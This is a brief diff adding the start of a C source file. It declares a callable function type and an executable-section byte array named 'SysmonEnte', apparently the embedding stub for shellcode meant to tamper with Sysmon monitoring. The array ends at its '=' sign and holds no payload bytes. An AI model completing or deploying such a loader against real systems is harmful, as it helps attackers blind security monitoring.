@@ -1,0 +1,6 @@
+#include "windows.h"
+#include <stdint.h>
+
+typedef DWORD(GO)(DWORD);
+__attribute__((section(".text"))) unsigned char SysmonEnte[] = 
+
